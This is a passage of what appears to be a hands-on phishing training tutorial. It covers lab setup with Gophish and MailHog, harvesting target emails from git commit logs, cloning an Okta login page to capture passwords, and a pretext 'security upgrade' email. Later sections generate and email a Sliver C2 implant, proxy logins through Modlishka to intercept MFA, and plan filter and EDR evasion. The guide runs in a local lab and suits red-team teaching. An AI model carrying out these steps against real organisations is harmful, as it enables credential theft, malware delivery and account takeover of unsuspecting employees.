</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>environment</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>VIRTUAL_HOST=mailhog.docker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>logging</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>driver</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;none&#39;</span><span class=w>  </span><span class=c># disable saving logs</span><span class=w>
</span></span></span></code></pre></div><p>Now we should be able to bring up our docker compose environment to test that it is working.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/docker/
</span></span><span class=line><span class=cl>sudo docker compose up
</span></span></code></pre></div><p>Let&rsquo;s open up the web interface now <a href=http://mailhog.docker:8025/>http://mailhog.docker:8025/</a>.</p><p><img src=/static/how-to-phishing/mailhog-first-setup.png alt="MailHog Landing Page"></p></div><div class=td-content style=page-break-before:always><h1 id=pg-cccb75289be1bc46ed538320ce35f27f>10 - Gophish</h1><h3 id=gophish>Gophish<a class=td-heading-self-link href=#gophish aria-label="Heading self-link"></a></h3><p>Let&rsquo;s create a file for our Gophish configuration:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p ~/Desktop/op/docker/gophish
</span></span><span class=line><span class=cl>touch ~/Desktop/op/docker/gophish/config.json
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;admin_server&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;listen_url&#34;</span><span class=p>:</span> <span class=s2>&#34;0.0.0.0:3333&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;use_tls&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;cert_path&#34;</span><span class=p>:</span> <span class=s2>&#34;gophish_admin.crt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;key_path&#34;</span><span class=p>:</span> <span class=s2>&#34;gophish_admin.key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;trusted_origins&#34;</span><span class=p>:</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>	<span class=p>},</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;phish_server&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;listen_url&#34;</span><span class=p>:</span> <span class=s2>&#34;0.0.0.0:80&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;use_tls&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;cert_path&#34;</span><span class=p>:</span> <span class=s2>&#34;example.crt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;key_path&#34;</span><span class=p>:</span> <span class=s2>&#34;example.key&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>},</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;db_name&#34;</span><span class=p>:</span> <span class=s2>&#34;sqlite3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;db_path&#34;</span><span class=p>:</span> <span class=s2>&#34;gophish.db&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;migrations_prefix&#34;</span><span class=p>:</span> <span class=s2>&#34;db/db_&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;contact_address&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;logging&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;filename&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;level&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Now we can add Gophish to our docker-compose services.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=w>  </span><span class=nt>gophish</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>gophish/gophish</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>container_name</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;gophish&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>environment</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>VIRTUAL_HOST=gophish.docker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>links</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;mailhog&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;gophish:/opt/gophish&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;./gophish/config.json:/opt/gophish/config.json&#34;</span><span class=w>
</span></span></span></code></pre></div><p>Finally, we need to add a Gophish named volume to the end:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>gophish</span><span class=p>:</span><span class=w> 
</span></span></span></code></pre></div><p>We should be able to bring up docker compose now:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker compose up
</span></span></code></pre></div><p>We need a password to log in to Gophish. Gophish automatically sets a password when you first start it. So lets open a new terminal and run the following.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/docker
</span></span><span class=line><span class=cl>sudo docker compose logs gophish <span class=p>|</span> grep <span class=s2>&#34; password &#34;</span>
</span></span></code></pre></div><p><img src=/static/how-to-phishing/gophish-initial-password.png alt="Gophish Initial Password"></p><ul><li>Open <a href=http://gophish.docker:3333/>http://gophish.docker:3333/</a>.</li><li>login with the user <code>admin</code> and the password you found in the logs.</li><li>change password (I used <code>gophishpass</code> for the VM).</li></ul><hr><h3 id=gophish-smtp-mailhog>Gophish SMTP MailHog<a class=td-heading-self-link href=#gophish-smtp-mailhog aria-label="Heading self-link"></a></h3><p>Go to <code>Sending Profiles</code> > <code>+ New Sending Profile</code>.</p><ul><li>Set <strong>Name</strong> to <code>Mailhog SMTP Testing Server</code>.</li><li>Set <strong>SMTP From</strong> to an email, I used <code>admin@phishing.test</code>.</li><li>Set <strong>Host</strong> to <code>mailhog:1025</code>, as this is the name of the linked container in the docker compose file.</li><li>Add a new Email Header <code>X-Mailer</code> and set it to <code>Outlook</code>. This overrides Gophish&rsquo;s default of <code>Gophish</code>.</li></ul><p><img src=/static/how-to-phishing/gophish-mailhog-smtp.png alt="SMTP Settings"></p><ul><li>Click <code>Send Test Email</code>.</li><li>Fill out the fields with mostly random things.</li></ul><p><img src=/static/how-to-phishing/gophish-mailhog-smtp-test-email.png alt="Gophish MailHog Send Test Email"></p><ul><li>We should see a nice testing email in MailHog</li></ul><p><img src=/static/how-to-phishing/mailhog-gophish-test-email.png alt="MailHog Gophish Test Email"></p><ul><li>Since everything is working, Click <code>Save</code> on the send profile.</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-8025e6a1540213fff01e9f1880cf6427>11 - Target Acquisition</h1><p>Where can we acquire targets?</p><h3 id=linkedin>LinkedIn<a class=td-heading-self-link href=#linkedin aria-label="Heading self-link"></a></h3><h4 id=pros>Pros<a class=td-heading-self-link href=#pros aria-label="Heading self-link"></a></h4><ul><li>Useful job role information.</li><li>Usually up to date.</li></ul><h4 id=cons>Cons<a class=td-heading-self-link href=#cons aria-label="Heading self-link"></a></h4><ul><li>Most likely violates LinkedIn policy if automated.</li><li>Automation is brittle and requires updates when changes are made.</li></ul><h3 id=breach-dumps>Breach Dumps<a class=td-heading-self-link href=#breach-dumps aria-label="Heading self-link"></a></h3><h4 id=pros-1>Pros<a class=td-heading-self-link href=#pros-1 aria-label="Heading self-link"></a></h4><ul><li>Could find valid passwords.</li><li>Confirm email address formatting.</li><li>cool services like Dehashed mean you don&rsquo;t have to maintain the data.</li></ul><h4 id=cons-1>Cons<a class=td-heading-self-link href=#cons-1 aria-label="Heading self-link"></a></h4><ul><li>Outdated.</li><li>Lots of data.</li></ul><h3 id=source-control>Source Control<a class=td-heading-self-link href=#source-control aria-label="Heading self-link"></a></h3><h4 id=pros-2>Pros<a class=td-heading-self-link href=#pros-2 aria-label="Heading self-link"></a></h4><ul><li>Easy to get.</li><li>Commit dates give an idea at how recently the information was valid.</li><li>Also acquire personal emails.</li></ul><h4 id=cons-2>Cons<a class=td-heading-self-link href=#cons-2 aria-label="Heading self-link"></a></h4><ul><li>Sometimes lots of repos.</li><li>Probably more.</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-4ea9292a9a10de147b6cccfbd7953fd1>12 - Target Acquisition: Git</h1><p>Go to GitHub and see what we can find. Open <a href=https://github.com/snakshare>https://github.com/snakshare</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p ~/Desktop/op/code/github.com/snakshare
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/code/github.com/snakshare
</span></span><span class=line><span class=cl>git clone https://github.com/SnakShare/snakshare.github.io.git
</span></span></code></pre></div><p>Now we can get a list of users and email addresses.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git log --pretty<span class=o>=</span><span class=s2>&#34;format:%aN, %ae%n%cN, %ce&#34;</span> <span class=p>|</span> sort -u <span class=p>|</span> tee ~/Desktop/op/git-users.csv
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-762fbf10c8d0ea99115f87dbe750ac11>13 - Basic Credential Harvesting</h1><h2 id=create-a-new-landing-page>Create a new landing page.<a class=td-heading-self-link href=#create-a-new-landing-page aria-label="Heading self-link"></a></h2><ul><li>open <a href=https://someplace.okta.com/>https://someplace.okta.com/</a></li><li>open dev console (f12)</li><li>in console run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>s</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s1>&#39;script&#39;</span><span class=p>);</span> <span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=p>{</span> <span class=nx>s</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>parentNode</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>s</span><span class=p>[</span><span class=mi>0</span><span class=p>])}</span>
</span></span></code></pre></div><p><img src=/static/how-to-phishing/basic-cred-harvest-landing-page-dev-console.png alt="Basic Credential Harvesting Landing Page"></p><ul><li>right click web page > inspect element.</li><li>find top HTML tag.</li><li>right click > copy > outer HTML.</li></ul><p><img src=/static/how-to-phishing/basic-cred-harvest-landing-page-html-copy-outer-html.png alt="Copy Outer HTML"></p><ul><li>paste HTML in landing page.</li><li>check capture data.</li><li>check capture password.</li><li>set redirect to <a href=https://www.okta.com/404.html>https://www.okta.com/404.html</a></li></ul><p><img src=/static/how-to-phishing/gophish-landing-page-creation.png alt="Gophish Landing Page"></p><h2 id=create-a-new-email-template>Create a new email template<a class=td-heading-self-link href=#create-a-new-email-template aria-label="Heading self-link"></a></h2><p>Be sure to include <code>{{.URL}}</code> <a href=https://docs.getgophish.com/user-guide/template-reference>ref</a></p><ul><li>Name: <code>Basic credential Harvesting</code></li><li>Envelope Sender: <code>guy@target.docker</code></li><li>Subject: <code>Account Security Feature Upgrade</code></li></ul><p>Text:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>All,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We are upgrading the security around our authentication services. Please login ({{.URL}}) to enable these new features.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thanks
</span></span><span class=line><span class=cl>-
</span></span><span class=line><span class=cl>Guy Withaface
</span></span><span class=line><span class=cl>IT
</span></span></code></pre></div><p>HTML:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>All,<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>We are upgrading the security around our authentication services. Please <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;{{.URL}}&#34;</span><span class=p>&gt;</span>login to enable these new features<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>.<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Thanks<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><img src=/static/how-to-phishing/gophish-basic-template-creation.png alt="Basic Credential Harvesting Email Template Creation"></p><h2 id=create-a-new-group-to-be-our-target>Create a new group to be our target<a class=td-heading-self-link href=#create-a-new-group-to-be-our-target aria-label="Heading self-link"></a></h2><p>We can download the CSV template and populate it with our users we found earlier. Then import the CSV template.</p><p><img src=/static/how-to-phishing/gophish-new-group.png alt="New Gophish Group"></p><ul><li>Create new Campaign that uses the above.<ul><li>Use <code>http://gophish.docker/this/path/doesnt/matter</code> for the URL.</li></ul></li></ul><p><img src=/static/how-to-phishing/basic-cred-harvest-campaign.png alt="Basic Credential Harvesting Campaign"></p><h3 id=test-email-in-mailhog>Test email in MailHog<a class=td-heading-self-link href=#test-email-in-mailhog aria-label="Heading self-link"></a></h3><ul><li><p>Open MailHog</p></li><li><p>click link.
<img src=/static/how-to-phishing/first-email.png alt="First Email">
<img src=/static/how-to-phishing/first-landing-page.png alt="First Landing Page"></p></li><li><p>attempt to log in with fake credentials.
<img src=/static/how-to-phishing/first-campaign.png alt="First Campaign Results"></p></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-43b20bb3758f90a501b1c68f60ffe9af>14 - State Review I</h1><p>This current setup would allow you to do basic credential harvesting phishing campaigns. Which may work on some organizations. However, Many modern organizations usually have additional protections. The following protections are standard security practices:</p><ul><li>Require MFA.</li><li>Email filtering (though most services provide a basic filter).</li><li>Email link protections (fancy bots to analyze link content before allowing users to visit the URL).</li><li>Domain monitoring (Certificate transparency logs for look alike domains).</li><li>Endpoint Protections.</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-21808e3ea448bdfa79d7e2558330a450>15 - Implant Setup With Sliver</h1><h3 id=basic-payload-delivery-sliver>Basic Payload Delivery: Sliver<a class=td-heading-self-link href=#basic-payload-delivery-sliver aria-label="Heading self-link"></a></h3><p>Sliver is an open source C2</p><ul><li><a href=https://github.com/BishopFox/sliver/wiki/Getting-Started>https://github.com/BishopFox/sliver/wiki/Getting-Started</a></li><li><a href=https://github.com/BishopFox/sliver/releases>https://github.com/BishopFox/sliver/releases</a></li></ul><p>Download the latest release and put in your <code>$PATH</code>. We should already have our dependencies installed when we set up the infrastructure.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir ~/bin
</span></span><span class=line><span class=cl>wget -O ~/bin/sliver-server_linux https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux
</span></span><span class=line><span class=cl>chmod +x ~/bin/sliver-server_linux
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-7ed8bcbefbfb0e761dd10d21f2e7a425>16 - Sliver: Generating an implant</h1><h3 id=generate-a-new-implant>Generate a new implant<a class=td-heading-self-link href=#generate-a-new-implant aria-label="Heading self-link"></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p ~/Desktop/op/sliver/implants
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/sliver
</span></span><span class=line><span class=cl>sliver-server_linux
</span></span></code></pre></div><p>We should now be in a <code>sliver</code> shell.</p><p><img src=/static/how-to-phishing/sliver-shell.png alt="Sliver Shell"></p><p>Now we can generate a test implant:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>generate --mtls 127.0.0.1 --save implants/default-sliver.exe
</span></span></code></pre></div><h3 id=testing-implant>Testing implant<a class=td-heading-self-link href=#testing-implant aria-label="Heading self-link"></a></h3><p>In the sliver shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mtls
</span></span></code></pre></div><p>In a new terminal window:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wine ~/Desktop/op/sliver/implants/default-sliver.exe
</span></span></code></pre></div><p><img src=/static/how-to-phishing/sliver-implant-test.png alt="Sliver Implant Test"></p><p>Now we can use the implant by calling <code>use [session id]</code>:</p><p><img src=/static/how-to-phishing/sliver-implant-use.png alt="Sliver Implant Usage"></p></div><div class=td-content style=page-break-before:always><h1 id=pg-8a4d9e0913a7a7eaa1acea6bf7a6747d>17 - Basic Implant Delivery</h1><ul><li>Copy first template.
<img src=/static/how-to-phishing/copy-email-template.png alt="Copy Email Template"></li><li>Add file attachment.</li><li>Update words.</li><li>Create new Campaign that uses the above.<ul><li>The landing page can stay the same, it is actually not used since we removed it from the template.</li></ul></li><li>wait for the email to send&mldr;<ul><li>The default sliver executable is ~15MB so it may take sometime for it to send&mldr;.</li></ul></li></ul><p><img src=/static/how-to-phishing/second-campaign-inbox.png alt="Second Campaign Inbox"></p><p>You can find the attachment under the MIME tab.
<img src=/static/how-to-phishing/mailhog-sliver-email-attachment-download.png alt="Sliver Attachment"></p></div><div class=td-content style=page-break-before:always><h1 id=pg-4c87c37856db8a4778bcfbc1efa019ba>18 - State Review II</h1><h3 id=how-can-we-make-this-better>How can we make this better?<a class=td-heading-self-link href=#how-can-we-make-this-better aria-label="Heading self-link"></a></h3><p>We need:</p><ul><li>Intercept MFA requests. We are already tricking the user to visiting our site, so this is easier than it sounds.</li><li>Use invisible HTML tags to bypass email filtering.</li><li>Detect bots and show them benign pages.</li><li>Ensure our domains do not match the target or prominent service provider.</li><li>Obfuscate payloads to bypass EDR protections.</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-4d4e404fb59ae84940cd24820edad509>19 - Modlishka</h1><h3 id=modlishka>Modlishka<a class=td-heading-self-link href=#modlishka aria-label="Heading self-link"></a></h3><p>Modlishka is an amazing tool that can mirror a website on the fly, rewriting links to ensure the site functions. This allows us to essentially MitM connections to our targeted service from a domain we control.</p><p>Checkout of Modlishka and get things setup to be run in docker.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir ~/Desktop/op/docker/modlishka
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/docker/modlishka
</span></span><span class=line><span class=cl>mkdir modlishka-data
</span></span><span class=line><span class=cl>touch modlishka-data/config.json
</span></span><span class=line><span class=cl>git clone https://github.com/Stage2Sec/Modlishka.git
</span></span><span class=line><span class=cl><span class=nb>cd</span> Modlishka
</span></span><span class=line><span class=cl>cp extra/docker/* .
</span></span></code></pre></div><p>Modlishka can take command line arguments or a configuration file. We are opting to use the configuration file. Add the following to <code>~/Desktop/op/docker/modlishka/modlishka-data/config.json</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;proxyDomain&#34;</span><span class=p>:</span> <span class=s2>&#34;modlishka.docker&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;target&#34;</span><span class=p>:</span> <span class=s2>&#34;testphp.vulnweb.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;trackingCookie&#34;</span><span class=p>:</span> <span class=s2>&#34;iamadumbcookie&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;trackingParam&#34;</span><span class=p>:</span> <span class=s2>&#34;rid&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;controlCreds&#34;</span><span class=p>:</span> <span class=s2>&#34;phisherman:phisherpass&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;controlURL&#34;</span><span class=p>:</span> <span class=s2>&#34;livewell&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;terminateRedirectUrl&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;terminateTriggers&#34;</span><span class=p>:</span> <span class=s2>&#34;/nowhere&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;allowSecureCookies&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;listeningAddress&#34;</span><span class=p>:</span> <span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;targetResources&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;jsRules&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;jsReflectParam&#34;</span><span class=p>:</span> <span class=s2>&#34;reflect&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;proxyAddress&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;forceHTTPS&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;forceHTTP&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;dynamicMode&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;debug&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;logPostOnly&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;disableSecurity&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;log&#34;</span><span class=p>:</span> <span class=s2>&#34;/data/creds.log&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;plugins&#34;</span><span class=p>:</span> <span class=s2>&#34;all&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;cert&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;certKey&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;certPool&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;rules&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;credParams&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>trackingParam</code> value is what Modlishka uses to determine what visits belong to what users, we&rsquo;ll map this to <code>rid</code> since that is what Gophish uses by default.</p><p>Now we can add Modlishka to our docker compose services.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=w>  </span><span class=nt>modlishka</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>build</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>context</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;modlishka/Modlishka/&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>entrypoint</span><span class=p>:</span><span class=w> </span><span class=l>/bin/proxy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>command</span><span class=p>:</span><span class=w> </span>-<span class=l>config /data/config.json</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>container_name</span><span class=p>:</span><span class=w> </span><span class=l>modlishka</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>environment</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>VIRTUAL_HOST=modlishka.docker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;./modlishka/modlishka-data:/data&#34;</span><span class=w>
</span></span></span></code></pre></div><p>Lets test it out. Lets stop docker compose and restart it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker compose up
</span></span></code></pre></div><p>Now open <a href=http://modlishka.docker/>http://modlishka.docker/</a>. We should see the Accunetix test site being hosted from our fake domain.</p><p><img src=/static/how-to-phishing/modlishka-accunetix-test-site.png alt="Modlishka Accunetix Test Site"></p></div><div class=td-content style=page-break-before:always><h1 id=pg-c2f1381909a74c0b6a8ea5aa04b37951>20 - Setup MFA Authentication Provider</h1><blockquote><p>If attending a live training, skip this section</p></blockquote><p>Now that we have Modlishka up and running. Let&rsquo;s get it configured with a target login provider. We&rsquo;ll use Authentik to get an Okta like experience.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir ~/Desktop/op/docker/authentik
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/docker/
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;PG_PASS=dumbpassword&#34;</span> &gt;&gt; .env
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;AUTHENTIK_SECRET_KEY=supersecretkeythatpaullikes&#34;</span> &gt;&gt; .env
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;AUTHENTIK_ERROR_REPORTING__ENABLED=true&#34;</span> &gt;&gt; .env
</span></span></code></pre></div><p>Add the follow for emails&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># SMTP Host Emails are sent to</span>
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__HOST</span><span class=o>=</span>mailhog
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__PORT</span><span class=o>=</span><span class=m>1025</span>
</span></span><span class=line><span class=cl><span class=c1># Optionally authenticate (don&#39;t add quotation marks to your password)</span>
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__USERNAME</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=nv>AUTHENTIK_EMAIL__PASSWORD</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=c1># Use StartTLS</span>
